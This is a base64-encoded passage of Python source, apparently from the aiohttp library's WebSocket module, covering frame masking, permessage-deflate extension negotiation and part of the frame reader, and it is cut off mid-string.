U09OIGRhdGEuXHJcblxyXG4gICAgICAgIC4uIHZlcnNpb25hZGRlZDo6IDAuMjJcclxuICAgICAgICAiIiJcclxuICAgICAgICByZXR1cm4gbG9hZHMoc2VsZi5kYXRhKVxyXG5cclxuXHJcbldTX0NMT1NFRF9NRVNTQUdFID0gV1NNZXNzYWdlKFdTTXNnVHlwZS5DTE9TRUQsIE5vbmUsIE5vbmUpXHJcbldTX0NMT1NJTkdfTUVTU0FHRSA9IFdTTWVzc2FnZShXU01zZ1R5cGUuQ0xPU0lORywgTm9uZSwgTm9uZSlcclxuXHJcblxyXG5jbGFzcyBXZWJTb2NrZXRFcnJvcihFeGNlcHRpb24pOlxyXG4gICAgIiIiV2ViU29ja2V0IHByb3RvY29sIHBhcnNlciBlcnJvci4iIiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29kZTogaW50LCBtZXNzYWdlOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb2RlID0gY29kZVxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oY29kZSwgbWVzc2FnZSlcclxuXHJcbiAgICBkZWYgX19zdHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIGNhc3Qoc3RyLCBzZWxmLmFyZ3NbMV0pXHJcblxyXG5cclxuY2xhc3MgV1NIYW5kc2hha2VFcnJvcihFeGNlcHRpb24pOlxyXG4gICAgIiIiV2ViU29ja2V0IHByb3RvY29sIGhhbmRzaGFrZSBlcnJvci4iIiJcclxuXHJcblxyXG5uYXRpdmVfYnl0ZW9yZGVyOiBGaW5hbFtzdHJdID0gc3lzLmJ5dGVvcmRlclxyXG5cclxuXHJcbiMgVXNlZCBieSBfd2Vic29ja2V0X21hc2tfcHl0aG9uXHJcbl9YT1JfVEFCTEU6IEZpbmFsW0xpc3RbYnl0ZXNdXSA9IFtieXRlcyhhIF4gYiBmb3IgYSBpbiByYW5nZSgyNTYpKSBmb3IgYiBpbiByYW5nZSgyNTYpXVxyXG5cclxuXHJcbmRlZiBfd2Vic29ja2V0X21hc2tfcHl0aG9uKG1hc2s6IGJ5dGVzLCBkYXRhOiBieXRlYXJyYXkpIC0+IE5vbmU6XHJcbiAgICAiIiJXZWJzb2NrZXQgbWFza2luZyBmdW5jdGlvbi5cclxuXHJcbiAgICBgbWFza2AgaXMgYSBgYnl0ZXNgIG9iamVjdCBvZiBsZW5ndGggNDsgYGRhdGFgIGlzIGEgYGJ5dGVhcnJheWBcclxuICAgIG9iamVjdCBvZiBhbnkgbGVuZ3RoLiBUaGUgY29udGVudHMgb2YgYGRhdGFgIGFyZSBtYXNrZWQgd2l0aCBgbWFza2AsXHJcbiAgICBhcyBzcGVjaWZpZWQgaW4gc2VjdGlvbiA1LjMgb2YgUkZDIDY0NTUuXHJcblxyXG4gICAgTm90ZSB0aGF0IHRoaXMgZnVuY3Rpb24gbXV0YXRlcyB0aGUgYGRhdGFgIGFyZ3VtZW50LlxyXG5cclxuICAgIFRoaXMgcHVyZS1weXRob24gaW1wbGVtZW50YXRpb24gbWF5IGJlIHJlcGxhY2VkIGJ5IGFuIG9wdGltaXplZFxyXG4gICAgdmVyc2lvbiB3aGVuIGF2YWlsYWJsZS5cclxuXHJcbiAgICAiIiJcclxuICAgIGFzc2VydCBpc2luc3RhbmNlKGRhdGEsIGJ5dGVhcnJheSksIGRhdGFcclxuICAgIGFzc2VydCBsZW4obWFzaykgPT0gNCwgbWFza1xyXG5cclxuICAgIGlmIGRhdGE6XHJcbiAgICAgICAgYSwgYiwgYywgZCA9IChfWE9SX1RBQkxFW25dIGZvciBuIGluIG1hc2spXHJcbiAgICAgICAgZGF0YVs6OjRdID0gZGF0YVs6OjRdLnRyYW5zbGF0ZShhKVxyXG4gICAgICAgIGRhdGFbMTo6NF0gPSBkYXRhWzE6OjRdLnRyYW5zbGF0ZShiKVxyXG4gICAgICAgIGRhdGFbMjo6NF0gPSBkYXRhWzI6OjRdLnRyYW5zbGF0ZShjKVxyXG4gICAgICAgIGRhdGFbMzo6NF0gPSBkYXRhWzM6OjRdLnRyYW5zbGF0ZShkKVxyXG5cclxuXHJcbmlmIE5PX0VYVEVOU0lPTlM6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIF93ZWJzb2NrZXRfbWFzayA9IF93ZWJzb2NrZXRfbWFza19weXRob25cclxuZWxzZTpcclxuICAgIHRyeTpcclxuICAgICAgICBmcm9tIC5fd2Vic29ja2V0IGltcG9ydCBfd2Vic29ja2V0X21hc2tfY3l0aG9uICAjIHR5cGU6IGlnbm9yZVtpbXBvcnRdXHJcblxyXG4gICAgICAgIF93ZWJzb2NrZXRfbWFzayA9IF93ZWJzb2NrZXRfbWFza19jeXRob25cclxuICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgICAgIF93ZWJzb2NrZXRfbWFzayA9IF93ZWJzb2NrZXRfbWFza19weXRob25cclxuXHJcbl9XU19ERUZMQVRFX1RSQUlMSU5HOiBGaW5hbFtieXRlc10gPSBieXRlcyhbMHgwMCwgMHgwMCwgMHhGRiwgMHhGRl0pXHJcblxyXG5cclxuX1dTX0VYVF9SRTogRmluYWxbUGF0dGVybltzdHJdXSA9IHJlLmNvbXBpbGUoXHJcbiAgICByIl4oPzo7XFxzKig/OiJcclxuICAgIHIiKHNlcnZlcl9ub19jb250ZXh0X3Rha2VvdmVyKXwiXHJcbiAgICByIihjbGllbnRfbm9fY29udGV4dF90YWtlb3Zlcil8IlxyXG4gICAgciIoc2VydmVyX21heF93aW5kb3dfYml0cyg/Oj0oXFxkKykpPyl8IlxyXG4gICAgciIoY2xpZW50X21heF93aW5kb3dfYml0cyg/Oj0oXFxkKykpPykpKSokIlxyXG4pXHJcblxyXG5fV1NfRVhUX1JFX1NQTElUOiBGaW5hbFtQYXR0ZXJuW3N0cl1dID0gcmUuY29tcGlsZShyInBlcm1lc3NhZ2UtZGVmbGF0ZShbXixdKyk/IilcclxuXHJcblxyXG5kZWYgd3NfZXh0X3BhcnNlKGV4dHN0cjogT3B0aW9uYWxbc3RyXSwgaXNzZXJ2ZXI6IGJvb2wgPSBGYWxzZSkgLT4gVHVwbGVbaW50LCBib29sXTpcclxuICAgIGlmIG5vdCBleHRzdHI6XHJcbiAgICAgICAgcmV0dXJuIDAsIEZhbHNlXHJcblxyXG4gICAgY29tcHJlc3MgPSAwXHJcbiAgICBub3Rha2VvdmVyID0gRmFsc2VcclxuICAgIGZvciBleHQgaW4gX1dTX0VYVF9SRV9TUExJVC5maW5kaXRlcihleHRzdHIpOlxyXG4gICAgICAgIGRlZmV4dCA9IGV4dC5ncm91cCgxKVxyXG4gICAgICAgICMgUmV0dXJuIGNvbXByZXNzID0gMTUgd2hlbiBnZXQgYHBlcm1lc3NhZ2UtZGVmbGF0ZWBcclxuICAgICAgICBpZiBub3QgZGVmZXh0OlxyXG4gICAgICAgICAgICBjb21wcmVzcyA9IDE1XHJcbiAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgbWF0Y2ggPSBfV1NfRVhUX1JFLm1hdGNoKGRlZmV4dClcclxuICAgICAgICBpZiBtYXRjaDpcclxuICAgICAgICAgICAgY29tcHJlc3MgPSAxNVxyXG4gICAgICAgICAgICBpZiBpc3NlcnZlcjpcclxuICAgICAgICAgICAgICAgICMgU2VydmVyIG5ldmVyIGZhaWwgdG8gZGV0ZWN0IGNvbXByZXNzIGhhbmRzaGFrZS5cclxuICAgICAgICAgICAgICAgICMgU2VydmVyIGRvZXMgbm90IG5lZWQgdG8gc2VuZCBtYXggd2JpdCB0byBjbGllbnRcclxuICAgICAgICAgICAgICAgIGlmIG1hdGNoLmdyb3VwKDQpOlxyXG4gICAgICAgICAgICAgICAgICAgIGNvbXByZXNzID0gaW50KG1hdGNoLmdyb3VwKDQpKVxyXG4gICAgICAgICAgICAgICAgICAgICMgR3JvdXAzIG11c3QgbWF0Y2ggaWYgZ3JvdXA0IG1hdGNoZXNcclxuICAgICAgICAgICAgICAgICAgICAjIENvbXByZXNzIHdiaXQgOCBkb2VzIG5vdCBzdXBwb3J0IGluIHpsaWJcclxuICAgICAgICAgICAgICAgICAgICAjIElmIGNvbXByZXNzIGxldmVsIG5vdCBzdXBwb3J0LFxyXG4gICAgICAgICAgICAgICAgICAgICMgQ09OVElOVUUgdG8gbmV4dCBleHRlbnNpb25cclxuICAgICAgICAgICAgICAgICAgICBpZiBjb21wcmVzcyA+IDE1IG9yIGNvbXByZXNzIDwgOTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgY29tcHJlc3MgPSAwXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgICAgICBpZiBtYXRjaC5ncm91cCgxKTpcclxuICAgICAgICAgICAgICAgICAgICBub3Rha2VvdmVyID0gVHJ1ZVxyXG4gICAgICAgICAgICAgICAgIyBJZ25vcmUgcmVnZXggZ3JvdXAgNSAmIDYgZm9yIGNsaWVudF9tYXhfd2luZG93X2JpdHNcclxuICAgICAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBpZiBtYXRjaC5ncm91cCg2KTpcclxuICAgICAgICAgICAgICAgICAgICBjb21wcmVzcyA9IGludChtYXRjaC5ncm91cCg2KSlcclxuICAgICAgICAgICAgICAgICAgICAjIEdyb3VwNSBtdXN0IG1hdGNoIGlmIGdyb3VwNiBtYXRjaGVzXHJcbiAgICAgICAgICAgICAgICAgICAgIyBDb21wcmVzcyB3Yml0IDggZG9lcyBub3Qgc3VwcG9ydCBpbiB6bGliXHJcbiAgICAgICAgICAgICAgICAgICAgIyBJZiBjb21wcmVzcyBsZXZlbCBub3Qgc3VwcG9ydCxcclxuICAgICAgICAgICAgICAgICAgICAjIEZBSUwgdGhlIHBhcnNlIHByb2dyZXNzXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgY29tcHJlc3MgPiAxNSBvciBjb21wcmVzcyA8IDk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIFdTSGFuZHNoYWtlRXJyb3IoIkludmFsaWQgd2luZG93IHNpemUiKVxyXG4gICAgICAgICAgICAgICAgaWYgbWF0Y2guZ3JvdXAoMik6XHJcbiAgICAgICAgICAgICAgICAgICAgbm90YWtlb3ZlciA9IFRydWVcclxuICAgICAgICAgICAgICAgICMgSWdub3JlIHJlZ2V4IGdyb3VwIDUgJiA2IGZvciBjbGllbnRfbWF4X3dpbmRvd19iaXRzXHJcbiAgICAgICAgICAgICAgICBicmVha1xyXG4gICAgICAgICMgUmV0dXJuIEZhaWwgaWYgY2xpZW50IHNpZGUgYW5kIG5vdCBtYXRjaFxyXG4gICAgICAgIGVsaWYgbm90IGlzc2VydmVyOlxyXG4gICAgICAgICAgICByYWlzZSBXU0hhbmRzaGFrZUVycm9yKCJFeHRlbnNpb24gZm9yIGRlZmxhdGUgbm90IHN1cHBvcnRlZCIgKyBleHQuZ3JvdXAoMSkpXHJcblxyXG4gICAgcmV0dXJuIGNvbXByZXNzLCBub3Rha2VvdmVyXHJcblxyXG5cclxuZGVmIHdzX2V4dF9nZW4oXHJcbiAgICBjb21wcmVzczogaW50ID0gMTUsIGlzc2VydmVyOiBib29sID0gRmFsc2UsIHNlcnZlcl9ub3Rha2VvdmVyOiBib29sID0gRmFsc2VcclxuKSAtPiBzdHI6XHJcbiAgICAjIGNsaWVudF9ub3Rha2VvdmVyPUZhbHNlIG5vdCB1c2VkIGZvciBzZXJ2ZXJcclxuICAgICMgY29tcHJlc3Mgd2JpdCA4IGRvZXMgbm90IHN1cHBvcnQgaW4gemxpYlxyXG4gICAgaWYgY29tcHJlc3MgPCA5IG9yIGNvbXByZXNzID4gMTU6XHJcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgIkNvbXByZXNzIHdiaXRzIG11c3QgYmV0d2VlbiA5IGFuZCAxNSwgIiAiemxpYiBkb2VzIG5vdCBzdXBwb3J0IHdiaXRzPTgiXHJcbiAgICAgICAgKVxyXG4gICAgZW5hYmxlZGV4dCA9IFsicGVybWVzc2FnZS1kZWZsYXRlIl1cclxuICAgIGlmIG5vdCBpc3NlcnZlcjpcclxuICAgICAgICBlbmFibGVkZXh0LmFwcGVuZCgiY2xpZW50X21heF93aW5kb3dfYml0cyIpXHJcblxyXG4gICAgaWYgY29tcHJlc3MgPCAxNTpcclxuICAgICAgICBlbmFibGVkZXh0LmFwcGVuZCgic2VydmVyX21heF93aW5kb3dfYml0cz0iICsgc3RyKGNvbXByZXNzKSlcclxuICAgIGlmIHNlcnZlcl9ub3Rha2VvdmVyOlxyXG4gICAgICAgIGVuYWJsZWRleHQuYXBwZW5kKCJzZXJ2ZXJfbm9fY29udGV4dF90YWtlb3ZlciIpXHJcbiAgICAjIGlmIGNsaWVudF9ub3Rha2VvdmVyOlxyXG4gICAgIyAgICAgZW5hYmxlZGV4dC5hcHBlbmQoXCdjbGllbnRfbm9fY29udGV4dF90YWtlb3ZlclwnKVxyXG4gICAgcmV0dXJuICI7ICIuam9pbihlbmFibGVkZXh0KVxyXG5cclxuXHJcbmNsYXNzIFdTUGFyc2VyU3RhdGUoSW50RW51bSk6XHJcbiAgICBSRUFEX0hFQURFUiA9IDFcclxuICAgIFJFQURfUEFZTE9BRF9MRU5HVEggPSAyXHJcbiAgICBSRUFEX1BBWUxPQURfTUFTSyA9IDNcclxuICAgIFJFQURfUEFZTE9BRCA9IDRcclxuXHJcblxyXG5jbGFzcyBXZWJTb2NrZXRSZWFkZXI6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZiwgcXVldWU6IERhdGFRdWV1ZVtXU01lc3NhZ2VdLCBtYXhfbXNnX3NpemU6IGludCwgY29tcHJlc3M6IGJvb2wgPSBUcnVlXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5xdWV1ZSA9IHF1ZXVlXHJcbiAgICAgICAgc2VsZi5fbWF4X21zZ19zaXplID0gbWF4X21zZ19zaXplXHJcblxyXG4gICAgICAgIHNlbGYuX2V4YyA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbQmFzZUV4Y2VwdGlvbl1cclxuICAgICAgICBzZWxmLl9wYXJ0aWFsID0gYnl0ZWFycmF5KClcclxuICAgICAgICBzZWxmLl9zdGF0ZSA9IFdTUGFyc2VyU3RhdGUuUkVBRF9IRUFERVJcclxuXHJcbiAgICAgICAgc2VsZi5fb3Bjb2RlID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtpbnRdXHJcbiAgICAgICAgc2VsZi5fZnJhbWVfZmluID0gRmFsc2VcclxuICAgICAgICBzZWxmLl9mcmFtZV9vcGNvZGUgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW2ludF1cclxuICAgICAgICBzZWxmLl9mcmFtZV9wYXlsb2FkID0gYnl0ZWFycmF5KClcclxuXHJcbiAgICAgICAgc2VsZi5fdGFpbCA9IGIiIlxyXG4gICAgICAgIHNlbGYuX2hhc19tYXNrID0gRmFsc2VcclxuICAgICAgICBzZWxmLl9mcmFtZV9tYXNrID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtieXRlc11cclxuICAgICAgICBzZWxmLl9wYXlsb2FkX2xlbmd0aCA9IDBcclxuICAgICAgICBzZWxmLl9wYXlsb2FkX2xlbmd0aF9mbGFnID0gMFxyXG4gICAgICAgIHNlbGYuX2NvbXByZXNzZWQgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW2Jvb2xdXHJcbiAgICAgICAgc2VsZi5fZGVjb21wcmVzc29iaiA9IE5vbmUgICMgdHlwZTogQW55ICAjIHpsaWIuZGVjb21wcmVzc29iaiBhY3R1YWxseVxyXG4gICAgICAgIHNlbGYuX2NvbXByZXNzID0gY29tcHJlc3NcclxuXHJcbiAgICBkZWYgZmVlZF9lb2Yoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLnF1ZXVlLmZlZWRfZW9mKClcclxuXHJcbiAgICBkZWYgZmVlZF9kYXRhKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiBUdXBsZVtib29sLCBieXRlc106XHJcbiAgICAgICAgaWYgc2VsZi5fZXhjOlxyXG4gICAgICAgICAgICByZXR1cm4gVHJ1ZSwgZGF0YVxyXG5cclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9mZWVkX2RhdGEoZGF0YSlcclxuICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGV4YzpcclxuICAgICAgICAgICAgc2VsZi5fZXhjID0gZXhjXHJcbiAgICAgICAgICAgIHNlbGYucXVldWUuc2V0X2V4Y2VwdGlvbihleGMpXHJcbiAgICAgICAgICAgIHJldHVybiBUcnVlLCBiIiJcclxuXHJcbiAgICBkZWYgX2ZlZWRfZGF0YShzZWxmLCBkYXRhOiBieXRlcykgLT4gVHVwbGVbYm9vbCwgYnl0ZXNdOlxyXG4gICAgICAgIGZvciBmaW4sIG9wY29kZSwgcGF5bG9hZCwgY29tcHJlc3NlZCBpbiBzZWxmLnBhcnNlX2ZyYW1lKGRhdGEpOlxyXG4gICAgICAgICAgICBpZiBjb21wcmVzc2VkIGFuZCBub3Qgc2VsZi5fZGVjb21wcmVzc29iajpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2RlY29tcHJlc3NvYmogPSB6bGliLmRlY29tcHJlc3NvYmood2JpdHM9LXpsaWIuTUFYX1dCSVRTKVxyXG4gICAgICAgICAgICBpZiBvcGNvZGUgPT0gV1NNc2dUeXBlLkNMT1NFOlxyXG4gICAgICAgICAgICAgICAgaWYgbGVuKHBheWxvYWQpID49IDI6XHJcbiAgICAgICAgICAgICAgICAgICAgY2xvc2VfY29kZSA9IFVOUEFDS19DTE9TRV9DT0RFKHBheWxvYWRbOjJdKVswXVxyXG4gICAgICAgICAgICAgICAgICAgIGlmIGNsb3NlX2NvZGUgPCAzMDAwIGFuZCBjbG9zZV9jb2RlIG5vdCBpbiBBTExPV0VEX0NMT1NFX0NPREVTOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBXZWJTb2NrZXRFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdTQ2xvc2VDb2RlLlBST1RPQ09MX0VSUk9SLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZiJJbnZhbGlkIGNsb3NlIGNvZGU6IHtjbG9zZV9jb2RlfSIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsb3NlX21lc3NhZ2UgPSBwYXlsb2FkWzI6XS5kZWNvZGUoInV0Zi04IilcclxuICAgICAgICAgICAgICAgICAgICBleGNlcHQgVW5pY29kZURlY29kZUVycm9yIGFzIGV4YzpcclxuICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgV2ViU29ja2V0RXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXU0Nsb3NlQ29kZS5JTlZBTElEX1RFWFQsICJJbnZhbGlkIFVURi04IHRleHQgbWVzc2FnZSJcclxuICAgICAgICAgICAgICAgICAgICAgICAgKSBmcm9tIGV4Y1xyXG4gICAgICAgICAgICAgICAgICAgIG1zZyA9IFdTTWVzc2FnZShXU01zZ1R5cGUuQ0xPU0UsIGNsb3NlX2NvZGUsIGNsb3NlX21lc3NhZ2UpXHJcbiAgICAgICAgICAgICAgICBlbGlmIHBheWxvYWQ6XHJcbiAgICAgICAgICAgICAgICAgICAgcmFpc2UgV2ViU29ja2V0RXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFdTQ2xvc2VDb2RlLlBST1RPQ09MX0VSUk9SLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBmIkludmFsaWQgY2xvc2UgZnJhbWU6IHtmaW59IHtvcGNvZGV9IHtwYXlsb2FkIXJ9IixcclxuICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgIG1zZyA9IFdTTWVzc2FnZShXU01zZ1R5cGUuQ0xPU0UsIDAsICIiKVxyXG5cclxuICAgICAgICAgICAgICAgIHNlbGYucXVldWUuZmVlZF9kYXRhKG1zZywgMClcclxuXHJcbiAgICAgICAgICAgIGVsaWYgb3Bjb2RlID09IFdTTXNnVHlwZS5QSU5HOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5xdWV1ZS5mZWVkX2RhdGEoXHJcbiAgICAgICAgICAgICAgICAgICAgV1NNZXNzYWdlKFdTTXNnVHlwZS5QSU5HLCBwYXlsb2FkLCAiIiksIGxlbihwYXlsb2FkKVxyXG4gICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICAgICAgZWxpZiBvcGNvZGUgPT0gV1NNc2dUeXBlLlBPTkc6XHJcbiAgICAgICAgICAgICAgICBzZWxmLnF1ZXVlLmZlZWRfZGF0YShcclxuICAgICAgICAgICAgICAgICAgICBXU01lc3NhZ2UoV1NNc2dUeXBlLlBPTkcsIHBheWxvYWQsICIiKSwgbGVuKHBheWxvYWQpXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgICAgICBlbGlmIChcclxuICAgICAgICAgICAgICAgIG9wY29kZSBub3QgaW4gKFdTTXNnVHlwZS5URVhULCBXU01zZ1R5cGUuQklOQVJZKVxyXG4gICAgICAgICAgICAgICAgYW5kIHNlbGYuX29wY29kZSBpcyBOb25lXHJcbiAgICAgICAgICAgICk6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBXZWJTb2NrZXRFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICBXU0Nsb3NlQ29kZS5QUk9UT0NPTF9FUlJPUiwgZiJVbmV4cGVjdGVkIG9wY29kZT17b3Bjb2RlIXJ9IlxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgIyBsb2FkIHRleHQvYmluYXJ5XHJcbiAgICAgICAgICAgICAgICBpZiBub3QgZmluOlxyXG4gICAgICAgICAgICAgICAgICAgICMgZ290IHBhcnRpYWwgZnJhbWUgcGF5bG9hZFxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG9wY29kZSAhPSBXU01zZ1R5cGUuQ09OVElOVUFUSU9OOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9vcGNvZGUgPSBvcGNvZGVcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9wYXJ0aWFsLmV4dGVuZChwYXlsb2FkKVxyXG4gICAgICAgICAgICAgICAgICAgIGlmIHNlbGYuX21heF9tc2dfc2l6ZSBhbmQgbGVuKHNlbGYuX3BhcnRpYWwpID49IHNlbGYuX21heF9tc2dfc2l6ZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgV2ViU29ja2V0RXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXU0Nsb3NlQ29kZS5NRVNTQUdFX1RPT19CSUcsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiTWVzc2FnZSBzaXplIHt9IGV4Y2VlZHMgbGltaXQge30iLmZvcm1hdChcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZW4oc2VsZi5fcGFydGlhbCksIHNlbGYuX21heF9tc2dfc2l6ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICAjIHByZXZpb3VzIGZyYW1lIHdhcyBub24gZmluaXNoZWRcclxuICAgICAgICAgICAgICAgICAgICAjIHdlIHNob3VsZCBnZXQgY29udGludWF0aW9uIG9wY29kZVxyXG4gICAgICAgICAgICAgICAgICAgIGlmIHNlbGYuX3BhcnRpYWw6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9wY29kZSAhPSBXU01zZ1R5cGUuQ09OVElOVUFUSU9OOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgV2ViU29ja2V0RXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV1NDbG9zZUNvZGUuUFJPVE9DT0xfRVJST1IsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlRoZSBvcGNvZGUgaW4gbm9uLWZpbiBmcmFtZSBpcyBleHBlY3RlZCAiXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInRvIGJlIHplcm8sIGdvdCB7IXJ9Ii5mb3JtYXQob3Bjb2RlKSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgb3Bjb2RlID09IFdTTXNnVHlwZS5DT05USU5VQVRJT046XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGFzc2VydCBzZWxmLl9vcGNvZGUgaXMgbm90IE5vbmVcclxuICAgICAgICAgICAgICAgICAgICAgICAgb3Bjb2RlID0gc2VsZi5fb3Bjb2RlXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX29wY29kZSA9IE5vbmVcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fcGFydGlhbC5leHRlbmQocGF5bG9hZClcclxuICAgICAgICAgICAgICAgICAgICBpZiBzZWxmLl9tYXhfbXNnX3NpemUgYW5kIGxlbihzZWxmLl9wYXJ0aWFsKSA+PSBzZWxmLl9tYXhfbXNnX3NpemU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIFdlYlNvY2tldEVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgV1NDbG9zZUNvZGUuTUVTU0FHRV9UT09fQklHLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIk1lc3NhZ2Ugc2l6ZSB7fSBleGNlZWRzIGxpbWl0IHt9Ii5mb3JtYXQoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGVuKHNlbGYuX3BhcnRpYWwpLCBzZWxmLl9tYXhfbXNnX3NpemVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgIyBEZWNvbXByZXNzIHByb2Nlc3MgbXVzdCB0byBiZSBkb25lIGFmdGVyIGFsbCBwYWNrZXRzXHJcbiAgICAgICAgICAgICAgICAgICAgIyByZWNlaXZlZC5cclxuICAgICAgICAgICAgICAgICAgICBpZiBjb21wcmVzc2VkOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9wYXJ0aWFsLmV4dGVuZChfV1NfREVGTEFURV9UUkFJTElORylcclxuICAgICAgICAgICAgICAgICAgICAgICAgcGF5bG9hZF9tZXJnZWQgPSBzZWxmLl9kZWNvbXByZXNzb2JqLmRlY29tcHJlc3MoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9wYXJ0aWFsLCBzZWxmLl9tYXhfbXNnX3NpemVcclxuICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiBzZWxmLl9kZWNvbXByZXNzb2JqLnVuY29uc3VtZWRfdGFpbDpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxlZnQgPSBsZW4oc2VsZi5fZGVjb21wcmVzc29iai51bmNvbnN1bWVkX3RhaWwpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBXZWJTb2NrZXRFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXU0Nsb3NlQ29kZS5NRVNTQUdFX1RPT19CSUcsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIkRlY29tcHJlc3NlZCBtZXNzYWdlIHNpemUge30gZXhjZWVkcyBsaW1pdCB7fSIuZm9ybWF0KFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9tYXhfbXNnX3NpemUgKyBsZWZ0LCBzZWxmLl9tYXhfbXNnX3NpemVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHBheWxvYWRfbWVyZ2VkID0gYnl0ZXMoc2VsZi5fcGFydGlhbClcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5fcGFydGlhbC5jbGVhcigpXHJcblxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG9wY29kZSA9PSBXU01zZ1R5cGUuVEVYVDpcclxuICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGV4dCA9IHBheWxvYWRfbWVyZ2VkLmRlY29kZSgidXRmLTgiKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5xdWV1ZS5mZWVkX2RhdGEoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV1NNZXNzYWdlKFdTTXNnVHlwZS5URVhULCB0ZXh0LCAiIiksIGxlbih0ZXh0KVxyXG4gICAgICAgICAgICAgICAgICAgICAgI